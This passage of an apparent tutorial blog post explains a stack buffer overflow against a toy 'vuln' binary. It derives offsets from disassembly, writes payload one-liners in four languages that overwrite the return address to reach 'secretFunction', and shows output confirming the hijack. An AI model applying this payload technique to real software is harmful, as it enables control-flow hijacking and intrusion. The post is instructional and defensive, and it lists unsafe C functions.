<blockquote style="margin:30px 0px;padding:0px;border-left:4px solid rgb(232, 232, 232);padding-left:20px;font-size:18px;opacity:0.6;letter-spacing:0px;">
<h3 style="margin:40px 0px 20px;padding:0px;font-size:26px;font-weight:300;line-height:1;letter-spacing:-1px;">Inferences:</h3>
</blockquote>
<ol style="margin:20px 0px;padding:0px;padding-left:20px;margin-left:1.35em;">
<li style="margin:0px;padding:0px;margin-bottom:30px;">
<p style="margin:0px;padding:0px;">The address of <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">secretFunction</code> is <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">0804849d</code> in hex.</p>
<div style="margin:0px;padding:0px;"><pre style="margin:0px;padding:25px 40px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;margin-top:15px;margin-bottom:15px;"><code style="margin:0px;padding:1px 5px;border:none;background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;padding-left:0px;"> 0804849d &lt;secretFunction&gt;:
</code></pre>
</div>
</li>
<li style="margin:0px;padding:0px;margin-bottom:30px;">
<p style="margin:0px;padding:0px;"><code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">38 in hex or 56 in decimal</code> bytes are reserved for the local variables of <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">echo</code> function.</p>
<div style="margin:0px;padding:0px;"><pre style="margin:0px;padding:25px 40px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;margin-top:15px;margin-bottom:15px;"><code style="margin:0px;padding:1px 5px;border:none;background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;padding-left:0px;"> 80484c0:    83 ec 38    sub         $0x38,%esp
</code></pre>
</div>
</li>
<li style="margin:0px;padding:0px;margin-bottom:30px;">
<p style="margin:0px;padding:0px;">The address of <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">buffer</code> starts <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">1c in hex or 28 in decimal</code> bytes before <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">%ebp</code>. This means that 28 bytes are reserved for <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">buffer</code> even though we asked for 20 bytes.</p>
<div style="margin:0px;padding:0px;"><pre style="margin:0px;padding:25px 40px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;margin-top:15px;margin-bottom:15px;"><code style="margin:0px;padding:1px 5px;border:none;background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;padding-left:0px;"> 80484cf:    8d 45 e4    lea         -0x1c(%ebp),%eax
</code></pre>
</div>
</li>
</ol>
<blockquote style="margin:30px 0px;padding:0px;border-left:4px solid rgb(232, 232, 232);padding-left:20px;font-size:18px;opacity:0.6;letter-spacing:0px;">
<h3 style="margin:40px 0px 20px;padding:0px;font-size:26px;font-weight:300;line-height:1;letter-spacing:-1px;">Designing payload:</h3>
</blockquote>
<p style="margin:20px 0px;padding:0px;">Now we know that 28 bytes are reserved for <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">buffer</code>, it is right next to <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">%ebp</code>(the Base pointer of the <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">main</code> function). Hence the next 4 bytes will store that <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">%ebp</code> and the next 4 bytes will store the return address(the address that <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">%eip</code> is going to jump to after it completes the function). Now it is pretty obvious how our payload would look like. The first 28+4=32 bytes would be any random characters and the next 4 bytes will be the address of the <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">secretFunction</code>.</p>
<p style="margin:20px 0px;padding:0px;"><em style="margin:0px;padding:0px;">Note: Registers are 4 bytes or 32 bits as the binary is compiled for a 32 bit system.</em></p>
<p style="margin:20px 0px;padding:0px;">The address of the <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">secretFunction</code> is <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">0804849d</code> in hex. Now depending on whether our machine is little-endian or big-endian we need to decide the proper format of the address to be put. For a little-endian machine we need to put the bytes in the reverse order. i.e. <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">9d 84 04 08</code>. The following scripts generate such payloads on the terminal. Use whichever language you prefer to:</p>
<div style="margin:20px 0px;padding:0px;"><pre style="margin:0px;padding:25px 40px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;"><code style="margin:0px;padding:1px 5px;border:none;background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;padding-left:0px;">ruby -e <span style="margin:0px;padding:0px;color:rgb(221, 17, 68);">'print "a"*32 + "\x9d\x84\x04\x08"'</span>

python -c <span style="margin:0px;padding:0px;color:rgb(221, 17, 68);">'print "a"*32 + "\x9d\x84\x04\x08"'</span>

perl -e <span style="margin:0px;padding:0px;color:rgb(221, 17, 68);">'print "a"x32 . "\x9d\x84\x04\x08"'</span>

php -r <span style="margin:0px;padding:0px;color:rgb(221, 17, 68);">'echo str_repeat("a",32) . "\x9d\x84\x04\x08";'</span>
</code></pre>
</div>
<p style="margin:20px 0px;padding:0px;"><em style="margin:0px;padding:0px;">Note: we print \x9d because 9d was in hex</em></p>
<p style="margin:20px 0px;padding:0px;">You can pipe this payload directly into the <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">vuln</code> binary.</p>
<div style="margin:20px 0px;padding:0px;"><pre style="margin:0px;padding:25px 40px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;"><code style="margin:0px;padding:1px 5px;border:none;background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;padding-left:0px;">ruby -e <span style="margin:0px;padding:0px;color:rgb(221, 17, 68);">'print "a"*32 + "\x9d\x84\x04\x08"'</span> | ./vuln

python -c <span style="margin:0px;padding:0px;color:rgb(221, 17, 68);">'print "a"*32 + "\x9d\x84\x04\x08"'</span> | ./vuln

perl -e <span style="margin:0px;padding:0px;color:rgb(221, 17, 68);">'print "a"x32 . "\x9d\x84\x04\x08"'</span> | ./vuln

php -r <span style="margin:0px;padding:0px;color:rgb(221, 17, 68);">'echo str_repeat("a",32) . "\x9d\x84\x04\x08";'</span> | ./vuln
</code></pre>
</div>
<p style="margin:20px 0px;padding:0px;">This is the output that I get:</p>
<div style="margin:20px 0px;padding:0px;"><pre style="margin:0px;padding:25px 40px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;"><code style="margin:0px;padding:1px 5px;border:none;background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;padding-left:0px;">Enter some text:
You entered: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&lt;rubbish 3 bytes&gt;
Congratulations!
You have entered in the secret function!
Illegal instruction (core dumped)
</code></pre>
</div>
<p style="margin:20px 0px;padding:0px;">Cool! we were able to overflow the buffer and modify the return address. The <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">secretFunction</code> got called. But this did foul up the stack as the program expected <code style="margin:0px;padding:1px 5px;border:1px solid rgb(213, 213, 233);background-color:rgb(238, 238, 255);border-radius:3px;font-size:18px;word-wrap:break-word;white-space:pre-wrap;">secretFunction</code> to be present.</p>
<blockquote style="margin:30px 0px;padding:0px;border-left:4px solid rgb(232, 232, 232);padding-left:20px;font-size:18px;opacity:0.6;letter-spacing:0px;">
<h3 style="margin:40px 0px 20px;padding:0px;font-size:26px;font-weight:300;line-height:1;letter-spacing:-1px;">What all C functions are vulnerable to Buffer Overflow Exploit?</h3>
</blockquote>
<ol style="margin:20px 0px;padding:0px;padding-left:20px;margin-left:1.35em;">
<li style="margin:0px;padding:0px;margin-bottom:30px;">gets</li>
<li style="margin:0px;padding:0px;margin-bottom:30px;">scanf</li>
<li style="margin:0px;padding:0px;margin-bottom:30px;">sprintf</li>
<li style="margin:0px;padding:0px;margin-bottom:30px;">strcpy</li>
</ol>
<p style="margin:20px 0px;padding:0px;">Whenever you are using buffers, be careful about their maximum length. Handle them appropriately.</p>
<blockquote style="margin:30px 0px;padding:0px;border-left:4px solid rgb(232, 232, 232);padding-left:20px;font-size:18px;opacity:0.6;letter-spacing:0px;">
<h3 style="margin:40px 0px 20px;padding:0px;font-size:26px;font-weight:300;line-height:1;letter-spacing:-1px;">What next?</h3>
</blockquote>
<p style="margin:20px 0px;padding:0px;">While managing <a href="https://backdoor.sdslabs.co/" style="margin:0px;padding:0px;color:rgb(42, 122, 226);text-decoration:none;">BackdoorCTF</a> I devised a simple challenge based on this vulnerability. <a href="https://backdoor.sdslabs.co/challenges/ECHO" style="margin:0px;padding:0px;color:rgb(42, 122, 226);text-decoration:none;">Here</a>. See if you can solve it!</p>
</div>
<div style="margin:0px 0px 30px;padding:0px;font-family:AvenirNext-Regular, Helvetica, sans-serif;font-size:1.25em;text-align:right;border-top:2px solid rgb(170, 170, 170);">
<p style="margin:20px 0px;padding:0px;">Find me on <a href="https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/" style="margin:0px;padding:0px;color:rgb(42, 122, 226);text-decoration:none;">Github</a> and <a href="https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/" style="margin:0px;padding:0px;color:rgb(42, 122, 226);text-decoration:none;">Twitter</a>
</p></div>
</div></div></div></div></div></div></div></body></html>